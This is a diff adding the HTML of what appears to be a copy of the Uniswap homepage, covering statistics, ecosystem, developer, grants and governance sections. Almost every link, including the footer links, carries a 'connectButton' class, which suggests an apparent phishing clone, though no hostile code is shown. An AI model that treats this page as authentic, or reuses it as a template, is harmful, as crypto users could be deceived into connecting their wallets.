+         <svg class="Icons__GithubIcon-sc-dy67gv-4 gIWJTD" fill="white" size="24" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12">
+          </path>
+         </svg>
+        </a>
+        <a class="pages__OutboundLink-sc-1hmqm-24 irHuFq connectButton" href="https://discord.gg/FCfyBSbCU5" rel="noreferrer noopenner" target="_blank">
+         <svg class="Icons__DiscordIcon-sc-dy67gv-1 dglOxj" fill="white" size="24" viewbox="0 0 71 55" xmlns="http://www.w3.org/2000/svg">
+          <path d="M60.105 4.898A58.55 58.55 0 0 0 45.653.415a.22.22 0 0 0-.233.11 40.784 40.784 0 0 0-1.8 3.697c-5.456-.817-10.886-.817-16.23 0-.485-1.164-1.201-2.587-1.828-3.697a.228.228 0 0 0-.233-.11 58.386 58.386 0 0 0-14.451 4.483.207.207 0 0 0-.095.082C1.578 18.73-.944 32.144.293 45.39a.244.244 0 0 0 .093.167c6.073 4.46 11.955 7.167 17.729 8.962a.23.23 0 0 0 .249-.082 42.08 42.08 0 0 0 3.627-5.9.225.225 0 0 0-.123-.312 38.772 38.772 0 0 1-5.539-2.64.228.228 0 0 1-.022-.378c.372-.279.744-.569 1.1-.862a.22.22 0 0 1 .23-.03c11.619 5.304 24.198 5.304 35.68 0a.219.219 0 0 1 .233.027c.356.293.728.586 1.103.865a.228.228 0 0 1-.02.378 36.384 36.384 0 0 1-5.54 2.637.227.227 0 0 0-.121.315 47.249 47.249 0 0 0 3.624 5.897.225.225 0 0 0 .249.084c5.801-1.794 11.684-4.502 17.757-8.961a.228.228 0 0 0 .092-.164c1.48-15.315-2.48-28.618-10.497-40.412a.18.18 0 0 0-.093-.084Zm-36.38 32.427c-3.497 0-6.38-3.211-6.38-7.156 0-3.944 2.827-7.156 6.38-7.156 3.583 0 6.438 3.24 6.382 7.156 0 3.945-2.827 7.156-6.381 7.156Zm23.593 0c-3.498 0-6.38-3.211-6.38-7.156 0-3.944 2.826-7.156 6.38-7.156 3.582 0 6.437 3.24 6.38 7.156 0 3.945-2.798 7.156-6.38 7.156Z">
+          </path>
+         </svg>
+        </a>
+       </nav>
+      </div>
+      <span class="pages__HideSmall-sc-1hmqm-14 grhsji">
+       <div class="pages__DataSection-sc-1hmqm-21 jAlCHi">
+        <div class="ProtocolData__StyledSectionFlex-sc-h5m8zg-0 ProtocolData__Numbers-sc-h5m8zg-1 kuasPN geQcJG" id="about" style="flex-direction:column">
+         <div style="display:flex;width:100%;justify-content:space-between;align-items:center;margin:0">
+          <div class="ProtocolData__StyledSectionFlex-sc-h5m8zg-0 ProtocolData__BigNumbers-sc-h5m8zg-2 kuasPN gwfsUB">
+           <div class="ProtocolData__Sparkle-sc-h5m8zg-3 gxOhgu">
+           </div>
+           <span>
+            $
+            <!-- -->
+            489B
+            <!-- -->
+            +
+           </span>
+           <p style="font-size:14px">
+            Trade Volume
+           </p>
+           <div class="ProtocolData__SparkleGray-sc-h5m8zg-5 etcczJ">
+           </div>
+          </div>
+          <div class="ProtocolData__StyledSectionFlex-sc-h5m8zg-0 ProtocolData__BigNumbers-sc-h5m8zg-2 kuasPN gwfsUB">
+           <span>
+            71M
+            <!-- -->
+            +
+           </span>
+           <p style="font-size:14px">
+            All Time Trades
+           </p>
+           <div class="ProtocolData__SparkleGray-sc-h5m8zg-5 etcczJ">
+           </div>
+          </div>
+          <div class="ProtocolData__StyledSectionFlex-sc-h5m8zg-0 ProtocolData__BigNumbers-sc-h5m8zg-2 kuasPN gwfsUB">
+           <div class="ProtocolData__SparkleBottom-sc-h5m8zg-4 sivXW">
+           </div>
+           <span>
+            300+
+           </span>
+           <p style="font-size:14px">
+            Integrations
+           </p>
+          </div>
+          <div class="ProtocolData__StyledSectionFlex-sc-h5m8zg-0 ProtocolData__BigNumbers-sc-h5m8zg-2 kuasPN gwfsUB">
+           <div class="ProtocolData__SparkleBottom-sc-h5m8zg-4 sivXW">
+           </div>
+           <span>
+            4,400+
+           </span>
+           <p style="font-size:14px">
+            Community Delegates
+           </p>
+          </div>
+         </div>
+        </div>
+       </div>
+      </span>
+      <section class="pages__StyledSection-sc-1hmqm-17 bWbfmA">
+       <div class="pages__StyledItemRow-sc-1hmqm-9 dhaUDp">
+        <div class="column__AutoColumn-sc-165u8h7-2 erlQmU">
+         <a class="connectButton" href="/ecosystem">
+          <h1 class="pages__StyledSectionHeader-sc-1hmqm-16 dqxWWK" style="margin:0">
+           UNISWAP ECOSYSTEM →
+          </h1>
+         </a>
+         <h3 class="pages__StyledSectionTitle-sc-1hmqm-6 eOtYdo" style="max-width:380px">
+          A growing network of DeFi Apps.
+         </h3>
+         <h3 class="pages__StyledBodySubText-sc-1hmqm-5 gnlFIX" style="max-width:390px">
+          Developers, traders, and liquidity providers participate together in a financial marketplace that is open and accessible to all.
+         </h3>
+        </div>
+        <div class="pages__StyledCard-sc-1hmqm-13 pages__AppsCard-sc-1hmqm-20 ljQfcR kNswXU">
+         <div class="column__AutoColumn-sc-165u8h7-2 erlOHg">
+          <h1>
+           300+
+          </h1>
+          <p>
+           Integrations
+          </p>
+          <a class="connectButton" href="/ecosystem">
+           <button class="Button__ButtonSecondary-sc-p6xn44-1 bpZKHt connectButton">
+            Explore all ↗
+           </button>
+          </a>
+         </div>
+        </div>
+       </div>
+      </section>
+      <section class="pages__StyledSection-sc-1hmqm-17 bWbfmA">
+       <a class="connectButton" href="/developers">
+        <h1 class="pages__StyledSectionHeader-sc-1hmqm-16 dqxWWK" style="margin-bottom:16px">
+         DEVELOPERS →
+        </h1>
+       </a>
+       <div class="pages__StyledItemRow-sc-1hmqm-9 dhaUDp">
+        <div class="pages__DeveloperColumn-sc-1hmqm-23 hYEWJR">
+         <div class="pages__StyledCard-sc-1hmqm-13 pages__DeveloperCard-sc-1hmqm-18 ljQfcR dVtfzf">
+          <div class="column__AutoColumn-sc-165u8h7-2 erlQmU">
+           <h3 class="pages__StyledSectionTitle-sc-1hmqm-6 eOtYdo">
+            Superpowers for DeFi developers.
+           </h3>
+           <div class="Type__SubTitle-sc-15ds5js-4 pages__ResponsiveSubTitle-sc-1hmqm-4 cLYjLL gFUmNE">
+            Build Defi apps and tools on the largest crypto project on Ethereum. Get started with quick start guides, protocol documentation, a Javascript SDK, and fully open source code.
+           </div>
+           <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Button__ButtonSecondary-sc-p6xn44-1 bpZKHt connectButton" href="https://docs.uniswap.org/" rel="noopener noreferrer" target="_blank">
+            Documentation ↗
+           </a>
+          </div>
+         </div>
+         <div class="row__Row-sc-qdrqaf-0 row__RowBetween-sc-qdrqaf-1 row__RowResponsive-sc-qdrqaf-5 ejxnCZ kQXIS hZmhPs" style="gap:16px;align-items:flex-end">
+          <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Card__CardButton-sc-1ko2fuw-2 icDTpT connectButton" href="https://uniswap.org/whitepaper-v3.pdf" rel="noopener noreferrer" style="width:100%;height:100%" target="_blank">
+           <div class="row__Row-sc-qdrqaf-0 row__RowBetween-sc-qdrqaf-1 ejxnCZ kQXIS">
+            <h2 class="pages__StyledBodySubTitle-sc-1hmqm-3 gqmAck">
+             V3 Whitepaper
+            </h2>
+            <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+             <line x1="7" x2="17" y1="17" y2="7">
+             </line>
+             <polyline points="7 7 17 7 17 17">
+             </polyline>
+            </svg>
+           </div>
+          </a>
+          <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Card__CardButton-sc-1ko2fuw-2 icDTpT connectButton" href="https://github.com/Uniswap" rel="noopener noreferrer" style="width:100%;height:100%" target="_blank">
+           <div class="row__Row-sc-qdrqaf-0 row__RowBetween-sc-qdrqaf-1 ejxnCZ kQXIS" style="height:100%">
+            <h2 class="pages__StyledBodySubTitle-sc-1hmqm-3 gqmAck">
+             Github
+            </h2>
+            <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+             <line x1="7" x2="17" y1="17" y2="7">
+             </line>
+             <polyline points="7 7 17 7 17 17">
+             </polyline>
+            </svg>
+           </div>
+          </a>
+         </div>
+        </div>
+        <div class="pages__StyledCard-sc-1hmqm-13 pages__GrantsCard-sc-1hmqm-22 ljQfcR kUfeEx">
+         <span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%">
+          <span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%">
+           <img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27120%27%20height=%27134%27/%3e" style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0"/>
+          </span>
+          <img class="pages__StyledProductImage-sc-1hmqm-7 xblKU" data-nimg="intrinsic" decoding="async" src="https://uniswap.org/cdn-cgi/image/width=256/images/unigrants.png" srcset="https://uniswap.org/cdn-cgi/image/width=128/images/unigrants.png 1x, https://uniswap.org/cdn-cgi/image/width=256/images/unigrants.png 2x" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/>
+          <noscript>
+           <img class="pages__StyledProductImage-sc-1hmqm-7 xblKU" data-nimg="intrinsic" decoding="async" loading="lazy" src="https://uniswap.org/cdn-cgi/image/width=256/images/unigrants.png" srcset="https://uniswap.org/cdn-cgi/image/width=128/images/unigrants.png 1x, https://uniswap.org/cdn-cgi/image/width=256/images/unigrants.png 2x" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/>
+          </noscript>
+         </span>
+         <div class="column__AutoColumn-sc-165u8h7-2 erlQmU">
+          <h2 class="pages__StyledBodySubTitle-sc-1hmqm-3 gqmAck">
+           Apply for funding from the Uniswap Grants Program
+          </h2>
+          <div class="Type__SubTitle-sc-15ds5js-4 pages__ResponsiveSubTitle-sc-1hmqm-4 cLYjLL gFUmNE">
+           Get paid to build the future of finance. Uniswap Governance offers grant funding for people building apps, tools, and activities on the Uniswap Protocol.
+          </div>
+          <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Button__ButtonSecondary-sc-p6xn44-1 bpZKHt connectButton" href="https://unigrants.org/" rel="noopener noreferrer" target="_blank">
+           <p style="margin:0">
+            Learn more ↗
+           </p>
+          </a>
+         </div>
+        </div>
+       </div>
+      </section>
+      <section class="pages__StyledSection-sc-1hmqm-17 bWbfmA">
+       <a class="connectButton" href="/governance">
+        <h1 class="pages__StyledSectionHeader-sc-1hmqm-16 dqxWWK" style="margin-bottom:16px">
+         PROTOCOL GOVERNANCE -&gt;
+        </h1>
+       </a>
+       <div class="pages__GovernanceRow-sc-1hmqm-10 dbMaFx">
+        <div class="pages__StyledCard-sc-1hmqm-13 pages__GovernanceCard-sc-1hmqm-19 ljQfcR bWsmme" style="display:flex;flex-direction:column;justify-content:space-between;height:100%">
+         <div class="column__AutoColumn-sc-165u8h7-2 erlQmU">
+          <h3 class="pages__StyledSectionTitle-sc-1hmqm-6 eOtYdo">
+           Governed by the community.
+          </h3>
+          <div class="Type__SubTitle-sc-15ds5js-4 pages__ResponsiveSubTitle-sc-1hmqm-4 cLYjLL gFUmNE" style="margin-bottom:1rem;color:white;opacity:0.8">
+           The Uniswap Protocol is managed by a global community of UNI token holders and delegates.
+          </div>
+         </div>
+         <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Button__ButtonSecondary-sc-p6xn44-1 bpZKHt connectButton" href="https://docs.uniswap.org/protocol/concepts/governance/guide-to-voting" rel="noopener noreferrer" style="opacity:0.8" target="_blank">
+          Read more ↗
+         </a>
+        </div>
+        <nav class="pages__StyledItemColumn-sc-1hmqm-11 lcGpZQ" style="display:flex;flex-direction:column">
+         <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Card__CardButton-sc-1ko2fuw-2 icDTpT connectButton" href="https://gov.uniswap.org" rel="noopener noreferrer" style="width:100%;border-radius:20px" target="_blank">
+          <h2 class="pages__StyledBodySubTitle-sc-1hmqm-3 gqmAck" style="margin-bottom:12px">
+           <div class="row__Row-sc-qdrqaf-0 row__RowFixed-sc-qdrqaf-4 ejxnCZ kbMsIe">
+            Governance Forum
+            <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="margin-left:8px" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+             <line x1="7" x2="17" y1="17" y2="7">
+             </line>
+             <polyline points="7 7 17 7 17 17">
+             </polyline>
+            </svg>
+           </div>
+          </h2>
+          <p style="text-align:left;margin:0;opacity:0.6;font-size:16px;font-weight:400">
+           Participate by proposing upgrades and discussing the future of the protocol with the Uniswap community.
+          </p>
+         </a>
+         <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Card__CardButton-sc-1ko2fuw-2 icDTpT connectButton" href="https://sybil.org/" rel="noopener noreferrer" style="width:100%;border-radius:20px" target="_blank">
+          <h2 class="pages__StyledBodySubTitle-sc-1hmqm-3 gqmAck" style="margin-bottom:12px">
+           <div class="row__Row-sc-qdrqaf-0 row__RowFixed-sc-qdrqaf-4 ejxnCZ kbMsIe">
+            Sybil
+            <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="margin-left:8px" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+             <line x1="7" x2="17" y1="17" y2="7">
+             </line>
+             <polyline points="7 7 17 7 17 17">
+             </polyline>
+            </svg>
+           </div>
+          </h2>
+          <p style="text-align:left;margin:0;opacity:0.6;font-size:16px;font-weight:400">
+           Vote on offchain proposals with the Snapshot interface. Votes are weighted by the number of UNI delegates.
+          </p>
+         </a>
+         <a class="Button__StyledLink-sc-p6xn44-3 NBQYa Card__CardButton-sc-1ko2fuw-2 icDTpT connectButton" href="https://app.uniswap.org/#/vote" rel="noopener noreferrer" style="width:100%;border-radius:20px" target="_blank">
+          <h2 class="pages__StyledBodySubTitle-sc-1hmqm-3 gqmAck" style="margin-bottom:12px">
+           <div class="row__Row-sc-qdrqaf-0 row__RowFixed-sc-qdrqaf-4 ejxnCZ kbMsIe">
+            Governance Portal
+            <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" style="margin-left:8px" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+             <line x1="7" x2="17" y1="17" y2="7">
+             </line>
+             <polyline points="7 7 17 7 17 17">
+             </polyline>
+            </svg>
+           </div>
+          </h2>
+          <p style="text-align:left;margin:0;opacity:0.6;font-size:16px;font-weight:400">
+           Vote on official Uniswap governance proposals and view past proposals.
+           <!-- -->
+          </p>
+         </a>
+        </nav>
+       </div>
+      </section>
+      <div class="Background__BG-sc-pxwoki-0 bAGTLZ">
+      </div>
+     </div>
+    </div>
+   </main>
+   <footer class="Footer__Wrapper-sc-ylteof-0 bmRgVz">
+    <div class="column__AutoColumn-sc-165u8h7-2 erlQZJ">
+     <div class="Footer__LinkSection-sc-ylteof-1 dztJWU">
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/ecosystem">
+       Ecosystem
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/community">
+       Community
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/governance">
+       Governance
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/developers">
+       Developers
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="https://blog.uniswap.org">
+       Blog
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/faq">
+       FAQ
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/privacy-policy">
+       Privacy Policy
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/trademark">
+       Trademark Policy
+      </a>
+      <a class="Footer__StyledLink-sc-ylteof-2 dclZmN connectButton" href="/security">
+       Security
+      </a>
+     </div>
+     <div class="Type__SubTitle-sc-15ds5js-4 Footer__MediaBlurb-sc-ylteof-4 cLYjLL hEejWT">
+      Media inquires for Uniswap Labs - Contact
+      <!-- -->
+      <a class="Button__StyledLink-sc-p6xn44-3 NBQYa connectButton" href="mailto:media@uniswap.org" rel="noopener noreferrer" target="_blank">
+       media@uniswap.org
+      </a>
+     </div>
+    </div>
+    <div class="Footer__SocialSection-sc-ylteof-3 iHDmnJ">
+     <a class="connectButton" href="https://discord.gg/FCfyBSbCU5" rel="noopener noreferrer" target="_blank">
+      <svg class="Icons__DiscordIcon-sc-dy67gv-1 hikTUQ" size="24" viewbox="0 0 71 55" xmlns="http://www.w3.org/2000/svg">
+       <path d="M60.105 4.898A58.55 58.55 0 0 0 45.653.415a.22.22 0 0 0-.233.11 40.784 40.784 0 0 0-1.8 3.697c-5.456-.817-10.886-.817-16.23 0-.485-1.164-1.201-2.587-1.828-3.697a.228.228 0 0 0-.233-.11 58.386 58.386 0 0 0-14.451 4.483.207.207 0 0 0-.095.082C1.578 18.73-.944 32.144.293 45.39a.244.244 0 0 0 .093.167c6.073 4.46 11.955 7.167 17.729 8.962a.23.23 0 0 0 .249-.082 42.08 42.08 0 0 0 3.627-5.9.225.225 0 0 0-.123-.312 38.772 38.772 0 0 1-5.539-2.64.228.228 0 0 1-.022-.378c.372-.279.744-.569 1.1-.862a.22.22 0 0 1 .23-.03c11.619 5.304 24.198 5.304 35.68 0a.219.219 0 0 1 .233.027c.356.293.728.586 1.103.865a.228.228 0 0 1-.02.378 36.384 36.384 0 0 1-5.54 2.637.227.227 0 0 0-.121.315 47.249 47.249 0 0 0 3.624 5.897.225.225 0 0 0 .249.084c5.801-1.794 11.684-4.502 17.757-8.961a.228.228 0 0 0 .092-.164c1.48-15.315-2.48-28.618-10.497-40.412a.18.18 0 0 0-.093-.084Zm-36.38 32.427c-3.497 0-6.38-3.211-6.38-7.156 0-3.944 2.827-7.156 6.38-7.156 3.583 0 6.438 3.24 6.382 7.156 0 3.945-2.827 7.156-6.381 7.156Zm23.593 0c-3.498 0-6.38-3.211-6.38-7.156 0-3.944 2.826-7.156 6.38-7.156 3.582 0 6.437 3.24 6.38 7.156 0 3.945-2.798 7.156-6.38 7.156Z">
+       </path>
+      </svg>
+     </a>
+     <a class="connectButton" href="https://github.com/Uniswap" rel="noopener noreferrer" target="_blank">
+      <svg class="Icons__GithubIcon-sc-dy67gv-4 JXMdA" size="24" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+       <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12">
+       </path>
+      </svg>
+     </a>
+     <a class="connectButton" href="https://twitter.com/Uniswap" rel="noopener noreferrer" target="_blank">
+      <svg class="Icons__TwitterIcon-sc-dy67gv-2 cUZtui" size="24" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+       <path d="M31.275 5.924c-.503.223-1.02.411-1.548.564a6.842 6.842 0 0 0 1.393-2.45.516.516 0 0 0-.755-.6 12.181 12.181 0 0 1-3.6 1.422 6.904 6.904 0 0 0-4.809-1.96 6.877 6.877 0 0 0-6.813 7.757A17.587 17.587 0 0 1 3.072 4.253a.516.516 0 0 0-.846.067 6.866 6.866 0 0 0-.93 3.454c0 1.655.59 3.225 1.634 4.452a5.816 5.816 0 0 1-.919-.41.516.516 0 0 0-.767.44v.091c0 2.47 1.33 4.695 3.362 5.908a5.882 5.882 0 0 1-.522-.076.516.516 0 0 0-.588.664 6.867 6.867 0 0 0 5.032 4.605 12.153 12.153 0 0 1-6.497 1.854c-.486 0-.976-.029-1.455-.085a.517.517 0 0 0-.339.946A18.525 18.525 0 0 0 10.255 29.1c6.994 0 11.37-3.298 13.808-6.065 3.041-3.45 4.785-8.016 4.785-12.528 0-.189-.003-.38-.009-.569a13.355 13.355 0 0 0 3.074-3.255.516.516 0 0 0-.638-.759Z">
+       </path>
+      </svg>
+     </a>
+    </div>
+   </footer>
+   <link href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.9.0/katex.min.css" rel="stylesheet"/>
+  </div>
+  <script id="__NEXT_DATA__" type="application/json">
+   {"props":{"pageProps":{}},"page":"/","query":{},"buildId":"L5JIf9Uj8AhMwjuK1fwi2","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}
+  </script>
+  <script data-nscript="afterInteractive" id="ga-analytics">
+   window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+            gtag('config', 'undefined', {'anonymize_ip': true });
+  </script>
+  <next-route-announcer>
+   <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+   </p>
+  </next-route-announcer>
+  <script data-nscript="lazyOnload" src="https://www.googletagmanager.com/gtag/js?id=undefined">
+  </script>
+  <script src="/_next/static/chunks/pages/ecosystem-e7e450448a0c4a07.js">
+  </script>
+  <script src="/_next/static/chunks/pages/community-31818c05a91c4aa6.js">
+  </script>
+  <script src="/_next/static/chunks/pages/developers-d292703076348cbe.js">
+  </script>
+  <script src="/_next/static/chunks/pages/faq-4d8d2f3620dde2b6.js">
+  </script>
+  <script src="/_next/static/chunks/712-1044477eee255e0d.js">
+  </script>
+  <script src="/_next/static/chunks/pages/governance-e8e6be40928133b4.js">
+  </script>
+  <script src="/_next/static/chunks/pages/privacy-policy-1ee6e44b8228b586.js">
+  </script>
+  <script src="/_next/static/chunks/pages/trademark-344d62730a5db17b.js">
+  </script>
+  <script src="/_next/static/chunks/pages/security-c4279b0a2fcc45ce.js">
+  </script>
+ </body>
+</html>
